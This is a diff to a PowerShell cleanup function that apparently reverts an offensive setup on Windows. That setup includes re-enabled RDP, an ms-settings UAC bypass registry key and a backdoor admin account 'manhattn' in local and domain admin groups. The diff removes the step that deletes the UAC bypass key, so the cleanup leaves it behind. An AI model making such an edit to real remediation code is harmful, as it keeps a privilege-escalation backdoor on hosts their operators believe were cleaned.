@@ -19,15 +19,11 @@ function revert_changes {
     # Deny RDP connections again
     reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 1 /f
 
-    # Remove UAC backdoor key if it exists
-    Remove-Item -Path HKCU:\Software\Classes\ms-settings -Recurse -Force -ErrorAction SilentlyContinue
-
-    # Remove local user "manhattn" if it exists
-    net user manhattn /delete
-
-    # Remove from groups just in case
+    # Cleanup the user account
     try { Remove-LocalGroupMember -Group "Administrators" -Member "manhattn" -ErrorAction SilentlyContinue } catch {}
     try { Remove-LocalGroupMember -Group "Remote Desktop Users" -Member "manhattn" -ErrorAction SilentlyContinue } catch {}
+
+    net user manhattn /delete
 
     # Remove from Domain Admins if domain joined
     try { Remove-ADGroupMember -Identity "Domain Admins" -Members "manhattn" -Confirm:$false -ErrorAction SilentlyContinue } catch {}
